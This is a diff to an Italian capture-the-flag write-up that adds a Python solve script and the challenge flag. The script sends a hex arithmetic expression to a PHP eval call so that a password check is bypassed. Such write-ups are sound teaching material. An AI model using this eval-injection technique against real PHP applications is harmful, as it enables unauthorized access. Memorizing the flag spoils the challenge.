@@ -50,8 +50,24 @@ eval("\$input=$inp;");
 Per il funzionamento interno della funzione `eval` possiamo usarla a nostro favore, passando come parametro "192014812" codificato, per esempio in esadecimale.
 Ricordiamoci che non possiamo passare direttamente il numero codificato, ma possiamo per esempio passare `192014822 - 10`.
 
+```py
+# Author: @benjamin
 
+import requests
 
+url = "https://benjaminn.altervista.org/web-1/index.php"
+
+# 192145884 -> numero più grande --> hex(192145884) = 0xb73e9dc
+# 192014812 -> numero
+# 131072    -> differenza --> hex(131072) = 0x20000
+payload = {
+    "password": "0xb73e9dc-0x20000"
+}
+
+r = requests.post(url, data=payload)
+
+print(r.text)
+```
 
 ## Flag
 havceCTF{m4l3det7o_3va1}
